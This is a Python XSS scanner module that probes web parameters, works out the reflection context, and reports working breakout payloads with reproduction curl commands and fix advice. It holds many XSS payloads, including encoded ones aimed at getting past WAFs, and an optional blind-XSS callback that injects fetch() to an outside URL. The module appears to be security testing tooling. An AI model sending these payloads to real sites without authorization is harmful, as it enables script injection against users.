#!/usr/bin/env python3
"""
XSS Breakout Context Detector - Enhanced Edition

Detects XSS vulnerabilities that ONLY work by breaking out of existing contexts:
- JavaScript string contexts (single/double quotes)
- JavaScript template literals (backticks)
- JSON value contexts
- Script tag contents
- HTML attribute values
- Event handler attributes

Enhancements:
- Template literal detection for modern JavaScript
- JSON context detection
- Multi-layer encoding detection
- WAF bypass payloads with encoding variations
- Improved context analysis with more patterns
"""

import httpx
import urllib.parse
import re
import json
import time
from typing import List, Dict, Tuple, Optional
from html.parser import HTMLParser
from dataclasses import dataclass


@dataclass
class BreakoutContext:
    """Information about a detected breakout scenario"""
    context_type: str  # 'js_string', 'js_template_literal', 'json_value', 'script_tag', 'html_attribute', 'event_handler'
    surrounding_code: str  # The actual code context found
    required_escape: str  # What needs to be escaped to break out
    breakout_payloads: List[Dict[str, str]]  # Specific payloads that work
    simple_payloads_blocked: bool  # Whether simple XSS payloads were blocked
    encoding_layers: List[str]  # Detected encoding layers


class BreakoutPayloadGenerator:
    """Generate context-specific breakout payloads"""
    
    @staticmethod
    def get_js_string_breakouts() -> List[Dict[str, str]]:
        """
        Payloads for breaking out of JavaScript string contexts
        Example: var search = 'USER_INPUT';
        """
        return [
            {
                'payload': "</script><script>alert(1)</script>",
                'description': "Close script tag without quote break (HTML parser)",
                'context': 'js_string_single'
            },
            {
                'payload': "</script><script>alert(1)</script>",
                'description': "Close script tag without quote break (HTML parser)",
                'context': 'js_string_double'
            },
            {
                'payload': "</script><img src=x onerror=alert(1)>",
                'description': "Close script tag + HTML event handler",
                'context': 'js_string_single'
            },
            {
                'payload': "</script><svg/onload=alert(1)>",
                'description': "Close script tag + SVG onload",
                'context': 'js_string_double'
            },
            {
                'payload': "'</script><script>alert('XSS')</script>",
                'description': "Single quote escape + script tag closure",
                'context': 'js_string_single'
            },
            {
                'payload': '"</script><script>alert("XSS")</script>',
                'description': "Double quote escape + script tag closure",
                'context': 'js_string_double'
            },
            {
                'payload': "';alert('XSS');//",
                'description': "Single quote escape + statement injection",
                'context': 'js_string_single'
            },
            {
                'payload': '";alert("XSS");//',
                'description': "Double quote escape + statement injection",
                'context': 'js_string_double'
            },
            {
                'payload': "'-alert('XSS')-'",
                'description': "String concatenation with alert",
                'context': 'js_string_single'
            },
            {
                'payload': '"+alert("XSS")+"',
                'description': "String concatenation with alert",
                'context': 'js_string_double'
            },
            {
                'payload': "\\\\'; alert('XSS'); //",
                'description': "Backslash escape bypass",
                'context': 'js_string_single'
            },
            {
                'payload': "';alert(String.fromCharCode(88,83,83));//",
                'description': "Character code obfuscation",
                'context': 'js_string_single'
            },
        ]
    
    @staticmethod
    def get_template_literal_breakouts() -> List[Dict[str, str]]:
        """
        Payloads for breaking out of JavaScript template literals
        Example: const search = `USER_INPUT`;
        """
        return [
            {
                'payload': '${alert(1)}',
                'description': "Template literal expression injection",
                'context': 'js_template_literal'
            },
            {
                'payload': '${alert(String.fromCharCode(88,83,83))}',
                'description': "Template expression with obfuscation",
                'context': 'js_template_literal'
            },
            {
                'payload': '`</script><script>alert(1)</script>',
                'description': "Template escape + script tag injection",
                'context': 'js_template_literal'
            },
            {
                'payload': '${document.location="javascript:alert(1)"}',
                'description': "Template expression navigation",
                'context': 'js_template_literal'
            },
        ]
    
    @staticmethod
    def get_json_context_breakouts() -> List[Dict[str, str]]:
        """
        Payloads for breaking out of JSON value contexts
        Example: {"search": "USER_INPUT"}
        """
        return [
            {
                'payload': '\\"></script><script>alert(1)</script><script x=\\"',
                'description': "JSON escape + script injection",
                'context': 'json_value'
            },
            {
                'payload': '\\"}</script><script>alert(1)</script><script>{"x":"',
                'description': "JSON object closure + script injection",
                'context': 'json_value'
            },
            {
                'payload': '\\"><img src=x onerror=alert(1)><\\"',
                'description': "JSON escape + HTML injection",
                'context': 'json_value'
            },
        ]
    
    @staticmethod
    def get_script_tag_breakouts() -> List[Dict[str, str]]:
        """
        Payloads for breaking out of script tag content
        Example: <script>var data = USER_INPUT;</script>
        """
        return [
            {
                'payload': "</script><script>alert('XSS')</script>",
                'description': "Close script tag and open new one",
                'context': 'script_tag'
            },
            {
                'payload': "</script><img src=x onerror=alert('XSS')>",
                'description': "Close script tag and inject HTML",
                'context': 'script_tag'
            },
            {
                'payload': "</script><svg/onload=alert('XSS')>",
                'description': "Close script tag and inject SVG",
                'context': 'script_tag'
            },
            {
                'payload': "</ScRiPt><script>alert('XSS')</script>",
                'description': "Case variation bypass",
                'context': 'script_tag'
            },
        ]
    
    @staticmethod
    def get_html_attribute_breakouts() -> List[Dict[str, str]]:
        """
        Payloads for breaking out of HTML attribute values
        Example: <input value="USER_INPUT">
        """
        return [
            {
                'payload': '" onload="alert(\'XSS\')',
                'description': "Double quote escape + event handler",
                'context': 'html_attribute_double'
            },
            {
                'payload': "' onload='alert(\"XSS\")",
                'description': "Single quote escape + event handler",
                'context': 'html_attribute_single'
            },
            {
                'payload': '"><script>alert("XSS")</script>',
                'description': "Close attribute and tag + script injection",
                'context': 'html_attribute_double'
            },
            {
                'payload': "'><script>alert('XSS')</script>",
                'description': "Close attribute and tag + script injection",
                'context': 'html_attribute_single'
            },
            {
                'payload': '" autofocus onfocus="alert(\'XSS\')',
                'description': "Attribute injection with event handler",
                'context': 'html_attribute_double'
            },
            {
                'payload': '" accesskey="x" onclick="alert(1)',
                'description': "Accesskey attribute injection",
                'context': 'html_attribute_double'
            },
        ]
    
    @staticmethod
    def get_event_handler_breakouts() -> List[Dict[str, str]]:
        """
        Payloads for breaking out of event handler attributes
        Example: <div onclick="doSomething('USER_INPUT')">
        """
        return [
            {
                'payload': "');alert('XSS');//",
                'description': "Close function call + statement injection",
                'context': 'event_handler_single'
            },
            {
                'payload': '");alert("XSS");//',
                'description': "Close function call + statement injection",
                'context': 'event_handler_double'
            },
            {
                'payload': "'-alert('XSS')-'",
                'description': "Expression injection",
                'context': 'event_handler_single'
            },
        ]
    
    @staticmethod
    def get_encoded_breakout_payloads() -> List[Dict[str, str]]:
        """
        Payloads with encoding to bypass WAF/filters
        """
        return [
            {
                'payload': "'%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E",
                'description': "URL encoded breakout",
                'context': 'js_string_single'
            },
            {
                'payload': "'\\u003c/script\\u003e\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
                'description': "Unicode escaped breakout",
                'context': 'js_string_single'
            },
            {
                'payload': "';alert(String.fromCharCode(88,83,83));//",
                'description': "Character code obfuscation",
                'context': 'js_string_single'
            },
            {
                'payload': '"\x3c/script\x3e\x3cscript\x3ealert(1)\x3c/script\x3e',
                'description': "Hex encoded breakout",
                'context': 'js_string_double'
            },
        ]
    
    @staticmethod
    def get_simple_test_payloads() -> List[str]:
        """
        Simple payloads that should work if NO context restriction exists
        If these fail but breakout payloads succeed, we have a breakout scenario
        """
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
        ]


class BreakoutContextAnalyzer:
    """Analyze response to determine exact breakout context"""
    
    @staticmethod
    def detect_encoding_layers(html: str, marker: str) -> List[str]:
        """
        Detect how many encoding layers are applied to the marker
        """
        encodings = []
        
        # Check for URL encoding
        url_encoded = urllib.parse.quote(marker)
        if url_encoded in html and url_encoded != marker:
            encodings.append('url_encoded')
        
        # Check for HTML encoding
        html_encoded = marker.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;')
        if any(enc in html for enc in [marker.replace('<', '&lt;'), marker.replace('<', '&#60;'), marker.replace('<', '&#x3C;')]):
            encodings.append('html_encoded')
        
        # Check for Unicode escaping
        if '\\u' in html:
            encodings.append('unicode_escaped')
        
        # Check for JavaScript string escaping
        if '\\' + marker[0] in html:
            encodings.append('js_escaped')
        
        return encodings
    
    @staticmethod
    def find_reflection_context(html: str, marker: str, response_headers: Dict = None) -> Optional[BreakoutContext]:
        """
        Find where the marker is reflected and analyze the context
        
        Returns:
            BreakoutContext object if context is found, None otherwise
        """
        if marker not in html:
            return None
        
        pos = html.find(marker)
        # Get 300 chars before and after for context analysis
        start = max(0, pos - 300)
        end = min(len(html), pos + len(marker) + 300)
        context = html[start:end]
        
        # Detect encoding layers
        encoding_layers = BreakoutContextAnalyzer.detect_encoding_layers(html, marker)
        
        # Pattern 1: Inside JavaScript template literal (NEW)
        pattern = r'`[^`]*' + re.escape(marker) + '[^`]*`'
        match = re.search(pattern, context)
        if match:
            return BreakoutContext(
                context_type='js_template_literal',
                surrounding_code=match.group(0),
                required_escape='Backtick and ${} expression injection',
                breakout_payloads=BreakoutPayloadGenerator.get_template_literal_breakouts(),
                simple_payloads_blocked=True,
                encoding_layers=encoding_layers
            )
        
        # Pattern 2: Inside JSON value (NEW)
        pattern = r'"[^"]*' + re.escape(marker) + r'[^"]*"\s*[,}]'
        match = re.search(pattern, context)
        content_type = response_headers.get('content-type', '') if response_headers else ''
        if match and ('application/json' in content_type or 'text/json' in content_type):
            return BreakoutContext(
                context_type='json_value',
                surrounding_code=match.group(0),
                required_escape='JSON string escape and script injection',
                breakout_payloads=BreakoutPayloadGenerator.get_json_context_breakouts(),
                simple_payloads_blocked=True,
                encoding_layers=encoding_layers
            )
        
        # Pattern 3: Inside JavaScript string (single quote)
        pattern = r"(?:var|let|const)\s+\w+\s*=\s*'[^']*" + re.escape(marker) + "[^']*'"
        match = re.search(pattern, context, re.IGNORECASE | re.DOTALL)
        if match:
            return BreakoutContext(
                context_type='js_string_single',
                surrounding_code=match.group(0),
                required_escape="Single quote (') and script tag closure",
                breakout_payloads=BreakoutPayloadGenerator.get_js_string_breakouts(),
                simple_payloads_blocked=True,
                encoding_layers=encoding_layers
            )
        
        # Pattern 4: Inside JavaScript string (double quote)
        pattern = r'(?:var|let|const)\s+\w+\s*=\s*"[^"]*' + re.escape(marker) + '[^"]*"'
        match = re.search(pattern, context, re.IGNORECASE | re.DOTALL)
        if match:
            return BreakoutContext(
                context_type='js_string_double',
                surrounding_code=match.group(0),
                required_escape='Double quote (") and script tag closure',
                breakout_payloads=BreakoutPayloadGenerator.get_js_string_breakouts(),
                simple_payloads_blocked=True,
                encoding_layers=encoding_layers
            )
        
        # Pattern 5: Inside script tag but not in string
        pattern = r'<script[^>]*>[^<]*' + re.escape(marker)
        match = re.search(pattern, context, re.IGNORECASE | re.DOTALL)
        if match:
            return BreakoutContext(
                context_type='script_tag',
                surrounding_code=match.group(0),
                required_escape='</script> tag closure',
                breakout_payloads=BreakoutPayloadGenerator.get_script_tag_breakouts(),
                simple_payloads_blocked=True,
                encoding_layers=encoding_layers
            )
        
        # Pattern 6: Inside HTML attribute value (double quote)
        pattern = r'<[^>]+\s+\w+\s*=\s*"[^"]*' + re.escape(marker)
        match = re.search(pattern, context, re.IGNORECASE)
        if match:
            return BreakoutContext(
                context_type='html_attribute_double',
                surrounding_code=match.group(0),
                required_escape='Double quote and tag closure',
                breakout_payloads=BreakoutPayloadGenerator.get_html_attribute_breakouts(),
                simple_payloads_blocked=True,
                encoding_layers=encoding_layers
            )
        
        # Pattern 7: Inside HTML attribute value (single quote)
        pattern = r"<[^>]+\s+\w+\s*=\s*'[^']*" + re.escape(marker)
        match = re.search(pattern, context, re.IGNORECASE)
        if match:
            return BreakoutContext(
                context_type='html_attribute_single',
                surrounding_code=match.group(0),
                required_escape="Single quote and tag closure",
                breakout_payloads=BreakoutPayloadGenerator.get_html_attribute_breakouts(),
                simple_payloads_blocked=True,
                encoding_layers=encoding_layers
            )
        
        # Pattern 8: Inside event handler
        pattern = r'<[^>]+\s+on\w+\s*=\s*["\'][^"\']*' + re.escape(marker)
        match = re.search(pattern, context, re.IGNORECASE)
        if match:
            quote_type = 'single' if "'" in match.group(0) else 'double'
            return BreakoutContext(
                context_type=f'event_handler_{quote_type}',
                surrounding_code=match.group(0),
                required_escape=f'{quote_type.capitalize()} quote and statement closure',
                breakout_payloads=BreakoutPayloadGenerator.get_event_handler_breakouts(),
                simple_payloads_blocked=True,
                encoding_layers=encoding_layers
            )
        
        return None
    
    @staticmethod
    def extract_context_snippet(html: str, marker: str, chars_before: int = 100, chars_after: int = 100) -> str:
        """
        Extract a readable snippet showing the marker in context
        """
        pos = html.find(marker)
        if pos == -1:
            return "[Marker not found in response]"
        
        start = max(0, pos - chars_before)
        end = min(len(html), pos + len(marker) + chars_after)
        snippet = html[start:end]
        
        # Highlight the marker
        snippet = snippet.replace(marker, f">>>{marker}<<<")
        
        return snippet


def detect_breakout_xss(url: str,
                        param_name: str = None,
                        method: str = 'GET',
                        form_data: Dict = None,
                        timeout: int = 10,
                        headers: Optional[Dict[str, str]] = None,
                        callback_url: str = None,
                        safe_mode: bool = True) -> Optional[Dict]:
    """
    Test a specific parameter for breakout XSS scenarios
    
    This function determines if XSS is possible ONLY through context breakout,
    not through simple payload injection.
    
    Args:
        url: Target URL
        param_name: Parameter name to test (for GET) or form field name (for POST)
        method: HTTP method ('GET' or 'POST')
        form_data: Form data dict (for POST requests)
        timeout: Request timeout
        callback_url: Optional callback URL for blind XSS testing
    
    Returns:
        Dictionary with breakout XSS details if found, None otherwise
    """
    marker = "__BREAKOUT_TEST_MARKER_" + str(hash(url + str(param_name)))[-8:] + "__"
    
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False, headers=headers) as client:
            from scanners.http_utils import request_with_backoff

            # Step 1: Test with marker to identify context
            if method == 'GET':
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                params[param_name] = [marker]
                flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                response = request_with_backoff(client, 'GET', f"{parsed.scheme}://{parsed.netloc}{parsed.path}", params=flat_params)
            else:  # POST
                test_data = form_data.copy() if form_data else {}
                test_data[param_name] = marker
                response = request_with_backoff(client, 'POST', url, data=test_data)
            
            # Analyze the context
            context = BreakoutContextAnalyzer.find_reflection_context(
                response.text, 
                marker,
                response_headers=dict(response.headers)
            )
            
            if not context:
                # Marker not reflected or in a context we don't recognize
                return None
            
            # Step 2: Verify simple payloads are blocked
            simple_payloads = BreakoutPayloadGenerator.get_simple_test_payloads()
            simple_payload_worked = False
            
            for simple_payload in simple_payloads:
                if method == 'GET':
                    params[param_name] = [simple_payload]
                    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    test_response = request_with_backoff(client, 'GET', f"{parsed.scheme}://{parsed.netloc}{parsed.path}", params=flat_params)
                else:
                    test_data[param_name] = simple_payload
                    test_response = request_with_backoff(client, 'POST', url, data=test_data)
                
                # Check if payload executed (not encoded)
                if simple_payload in test_response.text and not is_html_encoded(test_response.text, simple_payload):
                    simple_payload_worked = True
                    break
            
            # Template literals require expression injection; simple reflection isn't execution
            if context.context_type == 'js_template_literal':
                simple_payload_worked = False

            if simple_payload_worked:
                # If simple payloads work, it's not a breakout scenario
                return None
            
            # Step 3: Test breakout-specific payloads
            successful_breakout = None
            
            # Combine regular and encoded payloads (encoded only in unsafe mode)
            if safe_mode:
                all_payloads = context.breakout_payloads
                callback_url = None
            else:
                all_payloads = context.breakout_payloads + BreakoutPayloadGenerator.get_encoded_breakout_payloads()
            
            payload_limit = 6 if safe_mode else len(all_payloads)
            for payload_info in all_payloads[:payload_limit]:
                payload = payload_info['payload']
                
                # Filter payloads by context match
                if payload_info.get('context') and payload_info['context'] != context.context_type:
                    continue
                
                # If callback URL provided, inject it for blind XSS testing
                if callback_url and 'alert' in payload:
                    payload = payload.replace('alert(1)', f'fetch("{callback_url}?xss=breakout")')
                    payload = payload.replace("alert('XSS')", f'fetch("{callback_url}?xss=breakout")')
                    payload = payload.replace('alert("XSS")', f'fetch("{callback_url}?xss=breakout")')
                
                if method == 'GET':
                    params[param_name] = [payload]
                    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    test_response = request_with_backoff(client, 'GET', f"{parsed.scheme}://{parsed.netloc}{parsed.path}", params=flat_params)
                else:
                    test_data[param_name] = payload
                    test_response = request_with_backoff(client, 'POST', url, data=test_data)
                
                # Check if breakout payload worked
                if is_breakout_successful(test_response.text, payload, context.context_type):
                    successful_breakout = payload_info
                    successful_breakout['payload'] = payload  # Update with modified payload
                    break
            
            if not successful_breakout:
                # No breakout payload worked
                return None
            
            # Step 4: Generate detailed report
            context_snippet = BreakoutContextAnalyzer.extract_context_snippet(response.text, marker)
            
            result = {
                'vulnerability_type': 'breakout_xss',
                'context_type': context.context_type,
                'context_description': get_context_description(context.context_type),
                'parameter': param_name,
                'method': method,
                'url': url,
                'surrounding_code': context.surrounding_code,
                'context_snippet': context_snippet,
                'required_escape': context.required_escape,
                'successful_payload': successful_breakout['payload'],
                'payload_description': successful_breakout['description'],
                'simple_payloads_blocked': True,
                'encoding_layers': context.encoding_layers,
                'severity': 'high',
                'cvss_score': 7.5,  # High severity for context breakout XSS
                'remediation': generate_remediation(context.context_type),
                'exploitation': {
                    'curl_command': generate_curl_command(url, method, param_name, successful_breakout['payload'], form_data),
                    'explanation': generate_exploitation_explanation(context.context_type, successful_breakout),
                    'browser_steps': generate_browser_steps(url, method, param_name, successful_breakout['payload']),
                },
            }
            
            return result
    
    except Exception as e:
        print(f"Error in breakout detection: {str(e)}")
        return None


def is_html_encoded(html: str, payload: str) -> bool:
    """
    Check if the dangerous characters in the payload are encoded in the response.
    Returns True only when the payload is actually neutralised (chars are encoded).
    """
    # If raw payload appears verbatim, it is NOT encoded
    if payload in html:
        return False

    # Check whether '<' and '>' are both encoded when present in payload
    lt_forms = ['&lt;', '&#60;', '&#x3c;', '&#x3C;', '%3c', '%3C', '\\x3c', '\\u003c']
    gt_forms = ['&gt;', '&#62;', '&#x3e;', '&#x3E;', '%3e', '%3E', '\\x3e', '\\u003e']
    html_lower = html.lower()

    if '<' in payload and '>' in payload:
        lt_encoded = any(enc in html_lower for enc in lt_forms)
        gt_encoded = any(enc in html_lower for enc in gt_forms)
        return lt_encoded and gt_encoded

    # Check quote encoding for JS string contexts
    if "'" in payload:
        if '&#39;' in html or '\\u0027' in html or "\\'," in html:
            return True
    if '"' in payload:
        if '&quot;' in html or '\\u0022' in html or '\\"' in html:
            return True

    return False


def is_breakout_successful(html: str, payload: str, context_type: str) -> bool:
    """
    Determine if a breakout payload successfully escaped the context.
    Requires that the payload is reflected verbatim (not encoded) AND
    that the breakout markers are actually present in the unencoded form.
    """
    # Payload must be present verbatim and not encoded
    if payload not in html or is_html_encoded(html, payload):
        return False

    payload_lower = payload.lower()

    # Script-tag breakout: payload must close the script AND introduce new executable content
    if '</script' in payload_lower:
        # Ensure it is not just echoed inside a string or comment
        # Verify the closing tag is unencoded AND is followed by exploitable content
        if re.search(r'</script\s*>[^<]*<', html, re.IGNORECASE):
            return True
        return False

    if 'script' in context_type or context_type == 'script_tag':
        if '</script' in payload_lower and re.search(r'</script\s*>', html, re.IGNORECASE):
            return True

    # JavaScript string breakouts: quote must NOT be backslash-escaped in the response
    if 'js_string' in context_type:
        # Check single-quote breakout
        if "'" in payload and not re.search(r"\\'", html):
            if any(t in payload_lower for t in ['alert(', 'confirm(', 'prompt(', 'fetch(', '<script']):
                return True
        # Check double-quote breakout
        if '"' in payload and not re.search(r'\\"', html):
            if any(t in payload_lower for t in ['alert(', 'confirm(', 'prompt(', 'fetch(', '<script']):
                return True

    # Template literal breakout: backtick or ${...} must be unescaped
    if context_type == 'js_template_literal':
        if ('${' in payload or '`' in payload) and not re.search(r'\\`', html):
            return True

    # JSON value breakout: escape sequences must close the string
    if context_type == 'json_value':
        if re.search(r'["\'].*</?(script|img|svg)', payload_lower):
            return True

    # Attribute breakout: must close attribute AND tag, then introduce event handler or script
    if 'attribute' in context_type:
        has_tag_close = '">' in payload or "'>" in payload or '/>' in payload
        has_exploit = any(t in payload_lower for t in ['onerror', 'onload', 'onclick', 'onfocus', 'onmouseover', '<script'])
        if has_tag_close and has_exploit:
            return True

    return False


def get_context_description(context_type: str) -> str:
    """Get human-readable description of context type"""
    descriptions = {
        'js_string_single': "JavaScript string with single quotes (e.g., var x = 'USER_INPUT')",
        'js_string_double': 'JavaScript string with double quotes (e.g., var x = "USER_INPUT")',
        'js_template_literal': "JavaScript template literal (e.g., const x = `USER_INPUT`)",
        'json_value': "JSON value context (e.g., {\"key\": \"USER_INPUT\"})",
        'script_tag': "Inside <script> tag content",
        'html_attribute_single': "HTML attribute value with single quotes (e.g., <input value='USER_INPUT'>)",
        'html_attribute_double': 'HTML attribute value with double quotes (e.g., <input value="USER_INPUT">)',
        'event_handler_single': "Event handler with single quotes (e.g., onclick='func(\\'USER_INPUT\\')')",
        'event_handler_double': 'Event handler with double quotes (e.g., onclick="func(\\"USER_INPUT\\")")',
    }
    return descriptions.get(context_type, "Unknown context")


def generate_remediation(context_type: str) -> str:
    """Generate context-specific remediation advice"""
    remediations = {
        'js_string_single': "Properly escape JavaScript strings using JSON.stringify() or equivalent escaping that handles quotes, backslashes, and script tags. Never concatenate user input directly into JavaScript code.",
        'js_string_double': "Properly escape JavaScript strings using JSON.stringify() or equivalent escaping that handles quotes, backslashes, and script tags. Never concatenate user input directly into JavaScript code.",
        'js_template_literal': "Avoid placing user input in template literals. If necessary, use proper JavaScript escaping and Content Security Policy (CSP). Consider using textContent instead of innerHTML for dynamic content.",
        'json_value': "Use proper JSON encoding libraries that escape HTML characters. Ensure Content-Type is application/json and implement Content Security Policy to prevent script execution.",
        'script_tag': "Avoid placing user input inside <script> tags. If necessary, use proper JavaScript escaping and Content Security Policy (CSP) to prevent inline script execution.",
        'html_attribute_single': "HTML-encode all user input placed in attribute values. Use proper attribute value escaping that handles quotes and tag closures.",
        'html_attribute_double': "HTML-encode all user input placed in attribute values. Use proper attribute value escaping that handles quotes and tag closures.",
        'event_handler_single': "Never place user input in event handler attributes. If absolutely necessary, use strict JavaScript encoding and implement CSP.",
        'event_handler_double': "Never place user input in event handler attributes. If absolutely necessary, use strict JavaScript encoding and implement CSP.",
    }
    return remediations.get(context_type, "Implement proper output encoding for the detected context.")


def generate_curl_command(url: str, method: str, param_name: str, payload: str, form_data: Dict = None) -> str:
    """Generate curl command for reproduction"""
    if method == 'GET':
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param_name] = [payload]
        query = urllib.parse.urlencode(params, doseq=True)
        return f"curl -X GET '{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}'"
    else:
        data = form_data.copy() if form_data else {}
        data[param_name] = payload
        data_str = urllib.parse.urlencode(data)
        return f"curl -X POST -d '{data_str}' '{url}'"


def generate_browser_steps(url: str, method: str, param_name: str, payload: str) -> List[str]:
    """Generate step-by-step browser reproduction instructions"""
    steps = []
    
    if method == 'GET':
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param_name] = [payload]
        query = urllib.parse.urlencode(params, doseq=True)
        full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
        
        steps.append(f"Open browser and navigate to: {full_url}")
        steps.append("Observe that the XSS payload executes despite context restrictions")
        steps.append("Check browser console for any errors or successful execution")
    else:
        steps.append(f"Navigate to {url} in your browser")
        steps.append(f"Locate the form containing the '{param_name}' field")
        steps.append(f"Enter the following payload: {payload}")
        steps.append("Submit the form")
        steps.append("Observe that the XSS payload executes in the response")
    
    return steps


def generate_exploitation_explanation(context_type: str, payload_info: Dict) -> str:
    """Generate detailed explanation of how the exploit works"""
    base = f"This vulnerability requires breaking out of a {get_context_description(context_type)}. "
    
    if 'js_string' in context_type:
        return base + f"The payload '{payload_info['payload']}' works by first closing the JavaScript string with a quote, then either closing the script tag entirely or injecting a new JavaScript statement. {payload_info['description']}."
    
    elif context_type == 'js_template_literal':
        return base + f"The payload '{payload_info['payload']}' exploits template literal expression evaluation. {payload_info['description']}."
    
    elif context_type == 'json_value':
        return base + f"The payload '{payload_info['payload']}' breaks out of the JSON string context and injects script tags. {payload_info['description']}."
    
    elif context_type == 'script_tag':
        return base + f"The payload '{payload_info['payload']}' closes the existing <script> tag with </script>, then injects new HTML/JavaScript. {payload_info['description']}."
    
    elif 'attribute' in context_type:
        return base + f"The payload '{payload_info['payload']}' escapes the attribute value by closing the quote, then either closes the HTML tag to inject new elements or adds a new event handler attribute. {payload_info['description']}."
    
    elif 'event_handler' in context_type:
        return base + f"The payload '{payload_info['payload']}' breaks out of the function call context and injects a new JavaScript statement. {payload_info['description']}."
    
    return base + payload_info['description']
